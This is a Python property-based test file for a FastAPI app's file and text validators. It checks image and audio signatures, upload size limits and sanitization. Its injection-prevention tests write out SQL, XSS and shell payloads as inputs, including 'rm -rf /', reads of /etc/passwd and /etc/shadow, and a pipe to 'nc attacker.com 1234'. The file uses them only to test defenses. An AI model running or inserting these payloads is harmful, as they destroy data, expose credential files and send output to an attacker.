"""
Property-based tests for file validation.

These tests verify universal properties that should hold across all file
validation scenarios using Hypothesis for property-based testing.
"""
import io
import pytest
from hypothesis import given, strategies as st, assume, settings
from fastapi import UploadFile

from app.validators.file_validator import FileValidator
from app.core.exceptions import ValidationError


# Test file signatures for different types
JPEG_SIGNATURE = b'\xff\xd8\xff'
PNG_SIGNATURE = b'\x89PNG\r\n\x1a\n'
GIF_SIGNATURE = b'GIF89a'
# WAV files need full RIFF header with WAVE marker
WAV_SIGNATURE = b'RIFF\x00\x00\x00\x00WAVEfmt '
MP3_SIGNATURE = b'\xff\xfb'  # MP3 frame sync

# Non-image/audio signatures
PDF_SIGNATURE = b'%PDF'
ZIP_SIGNATURE = b'PK\x03\x04'
TEXT_SIGNATURE = b'This is plain text'


def create_upload_file(filename: str, content: bytes) -> UploadFile:
    """Create a mock UploadFile for testing."""
    file_obj = io.BytesIO(content)
    return UploadFile(filename=filename, file=file_obj)


def create_image_bytes(signature: bytes, size: int) -> bytes:
    """Create fake image bytes with proper signature."""
    # Start with signature, pad with zeros to reach desired size
    if size < len(signature):
        return signature[:size]
    return signature + b'\x00' * (size - len(signature))


def create_audio_bytes(signature: bytes, size: int) -> bytes:
    """Create fake audio bytes with proper signature."""
    if size < len(signature):
        return signature[:size]
    return signature + b'\x00' * (size - len(signature))


class TestImageMIMETypeVerification:
    """
    **Feature: api-improvements, Property 5: Image MIME type verification**
    **Validates: Requirements 2.1**
    
    For any uploaded file claiming to be an image, if the file signature does not
    match the declared MIME type, the validation should reject the file.
    """
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=1024 * 1024),  # 100 bytes to 1MB
        signature=st.sampled_from([JPEG_SIGNATURE, PNG_SIGNATURE, GIF_SIGNATURE])
    )
    def test_valid_image_signatures_accepted(self, file_size: int, signature: bytes):
        """Test that files with valid image signatures are accepted."""
        # Create file with valid image signature
        content = create_image_bytes(signature, file_size)
        upload_file = create_upload_file("test_image.jpg", content)
        
        # Should not raise ValidationError
        result = FileValidator.validate_image(upload_file, max_size=10 * 1024 * 1024)
        
        # Result should be the file bytes
        assert isinstance(result, bytes)
        assert len(result) == file_size
        assert result.startswith(signature)
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=1024 * 1024),
        invalid_signature=st.sampled_from([PDF_SIGNATURE, ZIP_SIGNATURE, TEXT_SIGNATURE, MP3_SIGNATURE])
    )
    def test_invalid_image_signatures_rejected(self, file_size: int, invalid_signature: bytes):
        """Test that files with non-image signatures are rejected."""
        # Create file with invalid signature for image
        content = invalid_signature + b'\x00' * (file_size - len(invalid_signature))
        upload_file = create_upload_file("fake_image.jpg", content)
        
        # Should raise ValidationError
        with pytest.raises(ValidationError) as exc_info:
            FileValidator.validate_image(upload_file, max_size=10 * 1024 * 1024)
        
        # Error should have details
        error = exc_info.value
        assert error.status_code == 400
        assert "details" in error.to_dict()
        assert error.details.get("field") == "image"
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=1024 * 1024),
    )
    def test_audio_signature_rejected_as_image(self, file_size: int):
        """Test that audio files are rejected when validated as images."""
        # Create file with audio signature
        content = create_audio_bytes(WAV_SIGNATURE, file_size)
        upload_file = create_upload_file("audio_as_image.jpg", content)
        
        # Should raise ValidationError
        with pytest.raises(ValidationError) as exc_info:
            FileValidator.validate_image(upload_file, max_size=10 * 1024 * 1024)
        
        error = exc_info.value
        assert error.status_code == 400
        assert "image" in error.message.lower() or "image" in str(error.details).lower()


class TestAudioMIMETypeVerification:
    """
    **Feature: api-improvements, Property 6: Audio MIME type verification**
    **Validates: Requirements 2.2**
    
    For any uploaded file claiming to be audio, if the file signature does not
    match the declared MIME type, the validation should reject the file.
    """
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=1024 * 1024),
        signature=st.sampled_from([WAV_SIGNATURE, MP3_SIGNATURE])
    )
    def test_valid_audio_signatures_accepted(self, file_size: int, signature: bytes):
        """Test that files with valid audio signatures are accepted."""
        # Create file with valid audio signature
        content = create_audio_bytes(signature, file_size)
        upload_file = create_upload_file("test_audio.wav", content)
        
        # Should not raise ValidationError
        result = FileValidator.validate_audio(upload_file, max_size=20 * 1024 * 1024)
        
        # Result should be the file bytes
        assert isinstance(result, bytes)
        assert len(result) == file_size
        assert result.startswith(signature)
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=1024 * 1024),
        invalid_signature=st.sampled_from([PDF_SIGNATURE, ZIP_SIGNATURE, TEXT_SIGNATURE, JPEG_SIGNATURE])
    )
    def test_invalid_audio_signatures_rejected(self, file_size: int, invalid_signature: bytes):
        """Test that files with non-audio signatures are rejected."""
        # Create file with invalid signature for audio
        content = invalid_signature + b'\x00' * (file_size - len(invalid_signature))
        upload_file = create_upload_file("fake_audio.wav", content)
        
        # Should raise ValidationError
        with pytest.raises(ValidationError) as exc_info:
            FileValidator.validate_audio(upload_file, max_size=20 * 1024 * 1024)
        
        # Error should have details
        error = exc_info.value
        assert error.status_code == 400
        assert "details" in error.to_dict()
        assert error.details.get("field") == "audio"
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=1024 * 1024),
    )
    def test_image_signature_rejected_as_audio(self, file_size: int):
        """Test that image files are rejected when validated as audio."""
        # Create file with image signature
        content = create_image_bytes(PNG_SIGNATURE, file_size)
        upload_file = create_upload_file("image_as_audio.wav", content)
        
        # Should raise ValidationError
        with pytest.raises(ValidationError) as exc_info:
            FileValidator.validate_audio(upload_file, max_size=20 * 1024 * 1024)
        
        error = exc_info.value
        assert error.status_code == 400
        assert "audio" in error.message.lower() or "audio" in str(error.details).lower()



class TestTextInjectionPrevention:
    """
    **Feature: api-improvements, Property 7: Text injection prevention**
    **Validates: Requirements 2.3**
    
    For any text input containing injection payloads (SQL, XSS, command injection patterns),
    the sanitization should neutralize the malicious content.
    """
    
    @settings(max_examples=100)
    @given(
        base_text=st.text(min_size=1, max_size=100, alphabet=st.characters(
            blacklist_categories=('Cc', 'Cs'),
            blacklist_characters='\x00'
        ))
    )
    def test_sql_injection_neutralized(self, base_text: str):
        """Test that SQL injection patterns are neutralized."""
        from app.validators.text_validator import TextValidator
        
        # Create text with SQL injection patterns
        sql_payloads = [
            f"{base_text}' OR '1'='1",
            f"{base_text}'; DROP TABLE users--",
            f"{base_text} UNION SELECT * FROM passwords",
            f"{base_text}' OR 1=1--",
        ]
        
        for payload in sql_payloads:
            # Sanitize should not raise an error
            sanitized = TextValidator.sanitize(payload, max_length=5000)
            
            # Sanitized text should not contain dangerous SQL patterns
            sanitized_upper = sanitized.upper()
            
            # Check that dangerous patterns are removed or neutralized
            # Single quotes should be escaped
            assert "'" not in sanitized or "''" in sanitized
            # SQL comments should be removed
            assert "--" not in sanitized
    
    @settings(max_examples=100)
    @given(
        base_text=st.text(min_size=1, max_size=100, alphabet=st.characters(
            blacklist_categories=('Cc', 'Cs'),
            blacklist_characters='\x00'
        ))
    )
    def test_xss_injection_neutralized(self, base_text: str):
        """Test that XSS injection patterns are neutralized."""
        from app.validators.text_validator import TextValidator
        
        # Create text with XSS patterns
        xss_payloads = [
            f"{base_text}<script>alert('xss')</script>",
            f"{base_text}<img src=x onerror=alert(1)>",
            f"{base_text}<iframe src='evil.com'>",
            f"<a href='javascript:alert(1)'>{base_text}</a>",
        ]
        
        for payload in xss_payloads:
            # Sanitize should not raise an error
            sanitized = TextValidator.sanitize(payload, max_length=5000)
            
            # Sanitized text should not contain HTML tags
            assert "<script" not in sanitized.lower()
            assert "<iframe" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert "onerror=" not in sanitized.lower()
    
    @settings(max_examples=100)
    @given(
        base_text=st.text(min_size=1, max_size=100, alphabet=st.characters(
            blacklist_categories=('Cc', 'Cs'),
            blacklist_characters='\x00'
        ))
    )
    def test_command_injection_neutralized(self, base_text: str):
        """Test that command injection patterns are neutralized."""
        from app.validators.text_validator import TextValidator
        
        # Create text with command injection patterns
        cmd_payloads = [
            f"{base_text}; rm -rf /",
            f"{base_text} && cat /etc/passwd",
            f"{base_text} | nc attacker.com 1234",
            f"{base_text}`whoami`",
            f"{base_text}$(cat /etc/shadow)",
        ]
        
        for payload in cmd_payloads:
            # Sanitize should not raise an error
            sanitized = TextValidator.sanitize(payload, max_length=5000)
            
            # Sanitized text should not contain shell metacharacters
            assert ";" not in sanitized
            assert "|" not in sanitized
            assert "`" not in sanitized
            assert "$(" not in sanitized
    
    @settings(max_examples=100)
    @given(
        injection_type=st.sampled_from(["sql", "xss", "command"]),
        text_length=st.integers(min_value=10, max_value=200)
    )
    def test_all_injection_types_produce_safe_output(self, injection_type: str, text_length: int):
        """Test that all injection types result in safe, sanitized output."""
        from app.validators.text_validator import TextValidator
        
        # Create payloads based on type
        if injection_type == "sql":
            payload = "x' OR '1'='1" + "A" * text_length
        elif injection_type == "xss":
            payload = "<script>alert(1)</script>" + "B" * text_length
        else:  # command
            payload = "; rm -rf /" + "C" * text_length
        
        # Sanitize
        sanitized = TextValidator.sanitize(payload, max_length=5000)
        
        # Result should be a string
        assert isinstance(sanitized, str)
        
        # Result should not be empty (we neutralize, not delete everything)
        assert len(sanitized) > 0
        
        # Result should not contain the most dangerous patterns
        dangerous_patterns = ["<script", "'; DROP", "; rm -rf", "$(", "`"]
        for pattern in dangerous_patterns:
            assert pattern not in sanitized.lower()



class TestEarlyFileSizeRejection:
    """
    **Feature: api-improvements, Property 8: Early file size rejection**
    **Validates: Requirements 2.4**
    
    For any file upload exceeding the configured size limit, the rejection should occur
    before the entire file is read into memory.
    """
    
    @settings(max_examples=100)
    @given(
        max_size=st.integers(min_value=1000, max_value=10000),
        excess_size=st.integers(min_value=1, max_value=5000)
    )
    def test_oversized_image_rejected_early(self, max_size: int, excess_size: int):
        """Test that oversized images are rejected before full read."""
        # Create a file that exceeds the limit
        file_size = max_size + excess_size
        content = create_image_bytes(JPEG_SIGNATURE, file_size)
        upload_file = create_upload_file("large_image.jpg", content)
        
        # Should raise ValidationError
        with pytest.raises(ValidationError) as exc_info:
            FileValidator.validate_image(upload_file, max_size=max_size)
        
        # Error should mention size limit
        error = exc_info.value
        assert error.status_code == 400
        assert "size" in error.message.lower() or "size" in str(error.details).lower()
        assert error.details.get("max_size_bytes") == max_size
    
    @settings(max_examples=100)
    @given(
        max_size=st.integers(min_value=1000, max_value=10000),
        excess_size=st.integers(min_value=1, max_value=5000)
    )
    def test_oversized_audio_rejected_early(self, max_size: int, excess_size: int):
        """Test that oversized audio files are rejected before full read."""
        # Create a file that exceeds the limit
        file_size = max_size + excess_size
        content = create_audio_bytes(WAV_SIGNATURE, file_size)
        upload_file = create_upload_file("large_audio.wav", content)
        
        # Should raise ValidationError
        with pytest.raises(ValidationError) as exc_info:
            FileValidator.validate_audio(upload_file, max_size=max_size)
        
        # Error should mention size limit
        error = exc_info.value
        assert error.status_code == 400
        assert "size" in error.message.lower() or "size" in str(error.details).lower()
        assert error.details.get("max_size_bytes") == max_size
    
    @settings(max_examples=100)
    @given(
        max_size=st.integers(min_value=1000, max_value=50000),
        actual_size=st.integers(min_value=100, max_value=1000)
    )
    def test_files_within_limit_accepted(self, max_size: int, actual_size: int):
        """Test that files within size limit are accepted."""
        assume(actual_size <= max_size)
        
        # Create a file within the limit
        content = create_image_bytes(JPEG_SIGNATURE, actual_size)
        upload_file = create_upload_file("small_image.jpg", content)
        
        # Should not raise ValidationError
        result = FileValidator.validate_image(upload_file, max_size=max_size)
        
        # Should return the file bytes
        assert isinstance(result, bytes)
        assert len(result) == actual_size
    
    @settings(max_examples=100)
    @given(
        max_size=st.integers(min_value=100, max_value=1000),
    )
    def test_file_exactly_at_limit_accepted(self, max_size: int):
        """Test that files exactly at the size limit are accepted."""
        # Create a file exactly at the limit
        content = create_image_bytes(PNG_SIGNATURE, max_size)
        upload_file = create_upload_file("exact_size.png", content)
        
        # Should not raise ValidationError
        result = FileValidator.validate_image(upload_file, max_size=max_size)
        
        # Should return the file bytes
        assert isinstance(result, bytes)
        assert len(result) == max_size



class TestInvalidFileTypeErrorDetail:
    """
    **Feature: api-improvements, Property 9: Invalid file type error detail**
    **Validates: Requirements 2.5**
    
    For any invalid file type upload, the error response should include specific details
    about why the file was rejected and what types are allowed.
    """
    
    @settings(max_examples=100)
    @given(
        invalid_signature=st.sampled_from([PDF_SIGNATURE, ZIP_SIGNATURE, TEXT_SIGNATURE]),
        filename=st.text(min_size=1, max_size=50, alphabet=st.characters(
            whitelist_categories=('L', 'N'),
            blacklist_characters='\x00'
        ))
    )
    def test_invalid_image_error_includes_details(self, invalid_signature: bytes, filename: str):
        """Test that invalid image errors include detailed information."""
        # Create file with invalid signature
        content = invalid_signature + b'\x00' * 100
        upload_file = create_upload_file(f"{filename}.jpg", content)
        
        # Should raise ValidationError with details
        with pytest.raises(ValidationError) as exc_info:
            FileValidator.validate_image(upload_file, max_size=10 * 1024 * 1024)
        
        error = exc_info.value
        
        # Error should have status code 400
        assert error.status_code == 400
        
        # Error should have details dict
        assert isinstance(error.details, dict)
        
        # Details should include field name
        assert "field" in error.details
        assert error.details["field"] == "image"
        
        # Details should include reason
        assert "reason" in error.details
        assert isinstance(error.details["reason"], str)
        assert len(error.details["reason"]) > 0
        
        # Details should include allowed types
        assert "allowed_types" in error.details
        assert isinstance(error.details["allowed_types"], list)
        assert len(error.details["allowed_types"]) > 0
        
        # Details should include filename
        assert "filename" in error.details
    
    @settings(max_examples=100)
    @given(
        invalid_signature=st.sampled_from([PDF_SIGNATURE, ZIP_SIGNATURE, JPEG_SIGNATURE]),
        filename=st.text(min_size=1, max_size=50, alphabet=st.characters(
            whitelist_categories=('L', 'N'),
            blacklist_characters='\x00'
        ))
    )
    def test_invalid_audio_error_includes_details(self, invalid_signature: bytes, filename: str):
        """Test that invalid audio errors include detailed information."""
        # Create file with invalid signature
        content = invalid_signature + b'\x00' * 100
        upload_file = create_upload_file(f"{filename}.wav", content)
        
        # Should raise ValidationError with details
        with pytest.raises(ValidationError) as exc_info:
            FileValidator.validate_audio(upload_file, max_size=20 * 1024 * 1024)
        
        error = exc_info.value
        
        # Error should have status code 400
        assert error.status_code == 400
        
        # Error should have details dict
        assert isinstance(error.details, dict)
        
        # Details should include field name
        assert "field" in error.details
        assert error.details["field"] == "audio"
        
        # Details should include reason
        assert "reason" in error.details
        assert isinstance(error.details["reason"], str)
        assert len(error.details["reason"]) > 0
        
        # Details should include allowed types
        assert "allowed_types" in error.details
        assert isinstance(error.details["allowed_types"], list)
        assert len(error.details["allowed_types"]) > 0
        
        # Details should include filename
        assert "filename" in error.details
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=1000),
        max_size=st.integers(min_value=10, max_value=50)
    )
    def test_size_error_includes_specific_details(self, file_size: int, max_size: int):
        """Test that size limit errors include specific size information."""
        assume(file_size > max_size)
        
        # Create oversized file
        content = create_image_bytes(JPEG_SIGNATURE, file_size)
        upload_file = create_upload_file("large.jpg", content)
        
        # Should raise ValidationError with size details
        with pytest.raises(ValidationError) as exc_info:
            FileValidator.validate_image(upload_file, max_size=max_size)
        
        error = exc_info.value
        
        # Error details should include max size
        assert "max_size_bytes" in error.details
        assert error.details["max_size_bytes"] == max_size
        
        # Error details should include human-readable size
        assert "max_size_mb" in error.details
        
        # Error should include reason explaining the rejection
        assert "reason" in error.details
        assert "exceeds" in error.details["reason"].lower() or "limit" in error.details["reason"].lower()
    
    @settings(max_examples=100)
    @given(
        error_type=st.sampled_from(["image", "audio"])
    )
    def test_error_messages_are_actionable(self, error_type: str):
        """Test that error messages provide actionable information."""
        # Create invalid file
        content = TEXT_SIGNATURE + b'\x00' * 100
        filename = f"invalid.{'jpg' if error_type == 'image' else 'wav'}"
        upload_file = create_upload_file(filename, content)
        
        # Get the error
        with pytest.raises(ValidationError) as exc_info:
            if error_type == "image":
                FileValidator.validate_image(upload_file, max_size=10 * 1024 * 1024)
            else:
                FileValidator.validate_audio(upload_file, max_size=20 * 1024 * 1024)
        
        error = exc_info.value
        
        # Error message should be clear
        assert len(error.message) > 0
        
        # Error should tell user what went wrong
        assert "reason" in error.details
        
        # Error should tell user what's allowed
        assert "allowed_types" in error.details
        assert len(error.details["allowed_types"]) > 0
